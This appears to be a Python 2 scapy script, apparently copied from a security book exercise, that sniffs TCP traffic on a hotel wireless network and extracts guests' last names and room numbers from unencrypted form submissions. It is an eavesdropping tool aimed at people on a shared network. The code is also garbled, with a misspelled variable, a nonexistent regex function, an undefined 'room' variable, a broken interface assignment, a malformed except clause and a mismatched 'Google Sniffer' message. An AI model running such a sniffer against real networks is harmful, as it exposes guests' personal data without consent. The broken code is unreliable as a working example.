import optparse
from scapy.all import *

def banner():
	print "[***]	Hotel Wireless Sniffer p180		[***]"

def findGuest(pkt):
	raw= pket.sprintf('%Raw.load%')
	name = re.findallI('(?i)LAST_NAME=(.*)&', raw)
	if name:
		print '[+] Found Hotel Guest '+str(name[0])+', Room # '+str(room[0])

def main():
	parser = optparse.OptionParser('usage%prog '+'-i <interface>')
	parser.add_option('-i', dest='interface', type ='string', help='specify interface to listen on')
	(options, args) = parser.parse_args()
	if options.interface == None:
		print parser.usage
		exit(0)
	else:
		conf, iface = options, interface
	try:
		print '[*] Starting Google Sniffer. '
		sniff(filter='tcp', prn=findGuest, store=0)
	except:
		KeyboardInterrupt:
		exit(0)

if __name__ == '__main__':
	main()